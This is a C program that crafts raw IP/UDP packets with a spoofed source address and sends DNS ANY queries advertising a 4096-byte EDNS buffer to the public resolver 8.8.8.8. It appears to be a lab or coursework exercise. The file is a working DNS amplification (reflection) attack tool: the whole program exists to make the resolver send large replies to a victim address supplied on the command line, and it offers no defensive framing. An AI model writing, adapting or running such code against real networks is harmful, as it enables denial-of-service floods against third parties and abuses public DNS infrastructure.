#pragma pack(1) /*packet in line*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>


/* Definition */
#define DNS_Server "8.8.8.8"
#define DOMAIN      "www.nctu.edu.tw"


/* Initialize global varible */
char *spoof_address;
int spoof_ip;

/* All the structure */
typedef struct {
    unsigned short id;
    unsigned char rd :1;
    unsigned char tc :1;
    unsigned char aa :1;
    unsigned char opcode :4;
    unsigned char qr :1;
    unsigned char rcode :4;
    unsigned char cd :1;
    unsigned char ad :1;
    unsigned char z :1;
    unsigned char ra :1;
    unsigned short q_count;
    unsigned short ans_count;
    unsigned short auth_count;
    unsigned short add_count;
} DNS_header;


typedef struct {
    unsigned short qtype;
    unsigned short qclass;
} DNS_query;

typedef struct{
    unsigned char name;
    unsigned short type;
    unsigned short udplength;
    unsigned char rcode;
    unsigned char ednsversion;
    unsigned short Z;
    unsigned short datalength;
} DNS_opt;

typedef struct {
    int one;
    int sock;
    char *packet;
    struct sockaddr_in target;
    struct iphdr *ip;
    struct udphdr *udp;
    DNS_header *dns;
    DNS_query *query;
    DNS_opt *opt;
} Trash;

/* Functions */
Trash *Create_Rawsock(Trash *);
Trash *stfu_kernel(Trash *);
unsigned short Checksum(unsigned short *, int);
Trash *Build_IP_Header(Trash *);
Trash *Build_UDP_Header(Trash *);
Trash *DNS_Request(Trash *);
void DNS_Format(char *, char *);
Trash *Build_Packet(Trash *,  int);
Trash *Fillin_sock(Trash *);
void Implement(int);


/* create raw socket */
Trash *Create_Rawsock(Trash *a)
{
    a->sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    return a;
}


/* say STFU to kernel - we set our own headers */
Trash *stfu_kernel(Trash *a)
{
    a->one = 1;

    setsockopt(a->sock, IPPROTO_IP, IP_HDRINCL, &a->one, sizeof(a->one));

    return a;
}


/* For IP and UDP header */
unsigned short Checksum(unsigned short *addr, int len)
{
    u_int32_t csum  = 0;
    
    while(len > 0) {
        csum += *addr++;
        len -= 2;
    }

    if(len == 0) {
        csum += *(unsigned char *) addr;
    }
    
    csum = ((csum >> 16) + (csum & 0xffff));
    csum = (csum + (csum >> 16));

    return (~csum);
}


/* build and fill in ip header */
Trash *Build_IP_Header(Trash *a)
{
    a->ip = (struct iphdr *) a->packet;

    a->ip->version = 4;
    a->ip->ihl = 5;
    a->ip->id = htonl(rand());
    a->ip->saddr = inet_addr(spoof_address);
    a->ip->daddr = inet_addr(DNS_Server);
    a->ip->ttl = 64;
    a->ip->tos = 0;
    a->ip->frag_off = 0;
    a->ip->protocol = IPPROTO_UDP;
    a->ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS_header) + 
                              sizeof(DNS_query) + sizeof(DNS_opt) + strlen(DOMAIN) + 1);
    a->ip->check = Checksum((unsigned short *) a->ip, sizeof(struct iphdr));

    return a;
}


/* build and fill in udp header */
Trash *Build_UDP_Header(Trash *a)
{
    a->udp = (struct udphdr *) (a->packet + sizeof(struct iphdr));

    a->udp->source = htons(rand());
    a->udp->dest = htons(spoof_ip);
    a->udp->len = htons(sizeof(struct udphdr) + sizeof(DNS_header) + sizeof(DNS_opt) + sizeof(DNS_query) + strlen(DOMAIN) + 1);
    a->udp->check = 0;

    return a;
}


/* Convert to DNS format */
void DNS_Format(char *qname, char *host)
{
    int i = 0;
    int j = 0;

    
    for (i = 0 ; i < (int) strlen(host) ; i++) {
        if (host[i] == '.') {
            *qname++ = i-j;
            for (; j < i; j++) {
                *qname++ = host[j];
            }
            j++;
        }
    }

    *qname++ = 0x00;
}


/* build and fill in dns request */
Trash *DNS_Request(Trash *a)
{
    char *qname = NULL;

    a->dns = (DNS_header *) (a->packet + sizeof(struct iphdr) + sizeof(struct udphdr));

    a->dns->id = (unsigned short) htons(getpid());
    a->dns->qr = 0;
    a->dns->opcode = 0;
    a->dns->aa = 0;
    a->dns->tc = 0;
    a->dns->rd = 1;
    a->dns->ra = 0;
    a->dns->z = 0;
    a->dns->ad = 0;
    a->dns->cd = 0;
    a->dns->rcode = 0;
    a->dns->q_count = htons(1);
    a->dns->ans_count = 0;
    a->dns->auth_count = 0;
    a->dns->add_count = htons(1);

    qname = &a->packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 
        sizeof(DNS_header)];

    DNS_Format(qname, DOMAIN);

    a->query = (DNS_query *) &a->packet[sizeof(struct iphdr) + 
        sizeof(struct udphdr) + sizeof(DNS_header) + (strlen(qname) + 1)];

    a->query->qtype = htons(255);
    a->query->qclass = htons(1);
    a->opt = (DNS_opt*)(a->packet + sizeof(struct iphdr) + 
                           sizeof(struct udphdr) + sizeof(DNS_header) + (strlen(qname)) + sizeof(DNS_query) + 1);
    a->opt->name = 0;
    a->opt->type  =htons(41) ;
    a->opt->udplength =htons(4096);
    a->opt->rcode = 0;
    a->opt->ednsversion = 0;
    a->opt->Z = htons(0x8000);
    a->opt->datalength = 0;

    return a;
}

Trash *Build_Packet(Trash *a, int c)
{   
    a->packet = (char *) malloc(4096);
    a->packet = memset(a->packet, 0x00, 4096);

    a = Build_IP_Header(a);
    a = Build_UDP_Header(a);
    a = DNS_Request(a);

    return a;
}

Trash *Fillin_sock(Trash *a)
{
    a->target.sin_family = AF_INET;
    a->target.sin_port = a->udp->dest;
    a->target.sin_addr.s_addr = a->ip->daddr;

    return a;
}

void Implement(int a)
{
    Trash *b = NULL;
    
    b = (Trash *) malloc(sizeof(Trash));
    b = memset(b, 0, sizeof(Trash)); /*0x00*/

    b = Create_Rawsock(b);
    b = stfu_kernel(b);
    b = Build_Packet(b, a);
    b = Fillin_sock(b);

    sendto(b->sock, b->packet, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS_header)
                             + sizeof(DNS_query) + sizeof(DNS_opt)+ strlen(DOMAIN) + 1, 0, (struct sockaddr *) &b->target, sizeof(b->target));

    close(b->sock);
    free(b->packet);
    free(b);

    return;
}


int main(int argc, char **argv)
{
    int a = 0;
    unsigned int i = 0;

    printf("argv[1]: %s\n", argv[1]);
    printf("argv[2]: %s\n", argv[2]);

    spoof_address = argv[1];
    spoof_ip = atoi(argv[2]);

    printf("spoof_address: %s\n", spoof_address);

    for (i = 0; i < 10; i++) {
        Implement(a);
        printf("packet %d\n",i);
    }
    printf("\n");
    
    return 0;
}

